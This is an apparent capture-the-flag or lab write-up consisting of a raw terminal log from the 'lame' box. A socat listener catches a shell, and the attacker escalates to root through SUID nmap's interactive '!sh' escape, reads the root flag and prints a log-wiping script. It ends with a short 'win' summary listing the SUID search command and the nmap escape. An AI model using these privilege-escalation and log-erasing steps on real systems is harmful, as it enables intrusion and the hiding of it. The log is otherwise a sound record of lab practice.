
```sh
┌──(kali㉿proxli)-[~/exploits]
└─$ socat file:`tty`,raw,echo=0 tcp-listen:444 
daemon@lame:/tmp$ ls -la
total 912
drwxrwxrwt  5 root     root      4096 May  9 20:42 .
drwxr-xr-x 21 root     root      4096 Oct 31  2020 ..
drwxrwxrwt  2 root     root      4096 May  9 16:49 .ICE-unix
-r--r--r--  1 root     root        11 May  9 16:49 .X0-lock
drwxrwxrwt  2 root     root      4096 May  9 16:49 .X11-unix
-rw-------  1 tomcat55 nogroup      0 May  9 16:50 5543.jsvc_up
-rw-r--r--  1 daemon   daemon       0 May  9 19:29 distcc_76168fc2.stdout
-rw-------  1 daemon   daemon       0 May  9 19:29 distcc_766d8fc2.stderr
-rw-r--r--  1 daemon   daemon       0 May  9 19:18 distcc_d90c8d44.stdout
-rw-------  1 daemon   daemon      57 May  9 19:21 distcc_d9d78d44.stderr
-rw-------  1 daemon   daemon       0 May  9 19:29 distccd_76aa8fc2.o
-rw-------  1 daemon   daemon      10 May  9 19:29 distccd_76bd8fc2.i
-rw-------  1 daemon   daemon       0 May  9 19:18 distccd_d9478d44.o
-rw-------  1 daemon   daemon      10 May  9 19:18 distccd_d94d8d44.i
-rw-r--r--  1 root     daemon     191 May  9 20:37 file_to_write
-rwxr-xr-x  1 daemon   daemon  860323 Apr 23  2024 linpeas.sh
-rwxr-xr-x  1 daemon   daemon    6569 May  9 20:40 rootme
-rw-r--r--  1 daemon   daemon     145 May  9 20:40 rootme.c
-rw-r--r--  1 daemon   daemon     240 May  9 20:42 rootme.nse
-rw-------  1 daemon   daemon      22 May  9 20:38 tmp.zWwwa29556
-rw-r--r--  1 root     root      1600 May  9 16:49 vgauthsvclog.txt.0
drwx------  2 root     root      4096 May  9 16:50 vmware-root
daemon@lame:/tmp$ /usr/bin/nmap --script rootme.nse

Starting Nmap 4.53 ( http://insecure.org ) at 2025-05-09 20:43 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.009 seconds
daemon@lame:/tmp$ sudo /usr/bin/nmap --script rootme.nse
[sudo] password for daemon: 
daemon@lame:/tmp$ ls -la
total 912
drwxrwxrwt  5 root     root      4096 May  9 20:42 .
drwxr-xr-x 21 root     root      4096 Oct 31  2020 ..
drwxrwxrwt  2 root     root      4096 May  9 16:49 .ICE-unix
-r--r--r--  1 root     root        11 May  9 16:49 .X0-lock
drwxrwxrwt  2 root     root      4096 May  9 16:49 .X11-unix
-rw-------  1 tomcat55 nogroup      0 May  9 16:50 5543.jsvc_up
-rw-r--r--  1 daemon   daemon       0 May  9 19:29 distcc_76168fc2.stdout
-rw-------  1 daemon   daemon       0 May  9 19:29 distcc_766d8fc2.stderr
-rw-r--r--  1 daemon   daemon       0 May  9 19:18 distcc_d90c8d44.stdout
-rw-------  1 daemon   daemon      57 May  9 19:21 distcc_d9d78d44.stderr
-rw-------  1 daemon   daemon       0 May  9 19:29 distccd_76aa8fc2.o
-rw-------  1 daemon   daemon      10 May  9 19:29 distccd_76bd8fc2.i
-rw-------  1 daemon   daemon       0 May  9 19:18 distccd_d9478d44.o
-rw-------  1 daemon   daemon      10 May  9 19:18 distccd_d94d8d44.i
-rw-r--r--  1 root     daemon     191 May  9 20:37 file_to_write
-rwxr-xr-x  1 daemon   daemon  860323 Apr 23  2024 linpeas.sh
-rwxr-xr-x  1 daemon   daemon    6569 May  9 20:40 rootme
-rw-r--r--  1 daemon   daemon     145 May  9 20:40 rootme.c
-rw-r--r--  1 daemon   daemon     240 May  9 20:42 rootme.nse
-rw-------  1 daemon   daemon      22 May  9 20:38 tmp.zWwwa29556
-rw-r--r--  1 root     root      1600 May  9 16:49 vgauthsvclog.txt.0
drwx------  2 root     root      4096 May  9 16:50 vmware-root
daemon@lame:/tmp$ ./nmap --interactive
bash: ./nmap: No such file or directory
daemon@lame:/tmp$ /usr/bin/nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
sh-3.2# whoami
root
sh-3.2# cd /root
sh-3.2# ls -la
total 80
drwxr-xr-x 13 root root 4096 May  9 16:50 .
drwxr-xr-x 21 root root 4096 Oct 31  2020 ..
-rw-------  1 root root  373 May  9 16:49 .Xauthority
lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
drwx------  3 root root 4096 May 20  2012 .config
drwx------  2 root root 4096 May 20  2012 .filezilla
drwxr-xr-x  5 root root 4096 May  9 16:49 .fluxbox
drwx------  2 root root 4096 May 20  2012 .gconf
drwx------  2 root root 4096 May 20  2012 .gconfd
drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
drwx------  4 root root 4096 May 20  2012 .mozilla
-rw-r--r--  1 root root  141 Oct 20  2007 .profile
drwx------  5 root root 4096 May 20  2012 .purple
-rwx------  1 root root    4 May 20  2012 .rhosts
drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
drwx------  2 root root 4096 May  9 16:49 .vnc
drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
-rwx------  1 root root  401 May 20  2012 reset_logs.sh
-rw-------  1 root root   33 May  9 16:50 root.txt
-rw-r--r--  1 root root  118 May  9 16:49 vnc.log
sh-3.2# cat root.txt
50615836ccdccfcdb960e6a24933b02a
sh-3.2# 
sh-3.2# 
sh-3.2# cat reset_logs.sh
#!/bin/sh

/etc/init.d/sysklogd stop
VARLOGS="auth.log boot btmp daemon.log debug dmesg kern.log mail.info mail.log mail.warn messages syslog udev wtmp"
cd /var/log
for ii in $VARLOGS; do
  echo -n > $ii
  rm -f $ii.? $ii.?.gz
done

/etc/init.d/samba stop
rm -f /var/log/samba/*

rm -f /var/lib/dhcp3/*

for ii in /var/log/proftpd/* /var/log/postgresql/* /var/log/apache2/*; do
  echo -n > $ii
done


sh-3.2# 
```

fixing overwritten bits
```sh

```

the win was:
```sh
#find suid binaries
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null

#nmap found
/usr/bin/nmap --interactive
!sh
```
